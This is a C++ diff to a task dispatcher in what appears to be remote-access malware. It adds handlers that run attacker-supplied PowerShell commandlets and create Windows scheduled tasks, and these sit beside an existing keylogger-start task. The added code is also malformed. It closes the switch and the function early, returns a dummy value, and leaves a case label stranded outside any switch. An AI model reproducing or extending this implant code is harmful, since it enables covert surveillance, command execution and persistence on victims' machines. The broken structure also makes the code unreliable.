@@ -22,6 +22,23 @@ Request TaskQueueManager::ParseTaskRequest(const std::string &rawJson)
 
 	switch (type)
 	{
+		case POWERSHELL:
+		{
+			auto cmd = node["Commandlet"].GetString();
+			auto arg = node["Arguements"].GetString();
+			return CreateTaskRequest<CommandPowershell>(taskID, type, code, status, CommandPowershell{ cmd, arg });
+		}
+		case WIN_TASK:
+		{
+			auto path = node["Path"].GetString();
+			auto username = node["Username"].GetString();
+			auto taskName = node["TaskName"].GetString();
+			return CreateTaskRequest<CommandWinTask>(taskID, type, code, status, CommandWinTask{ path, username, taskName });
+		}
+	}
+	TaskRequest<bool> test;
+	return test;
+}
 
 	case KEYLOGGER_START:
 	{
@@ -136,6 +153,7 @@ void TaskQueueManager::StoreTaskResult(Response &response)
 std::string TaskQueueManager::GetTaskResults()
 {
 	std::string json = CreateResponseTaskValue(taskResults);
+	taskResults.clear();
 	return json;
 }
 
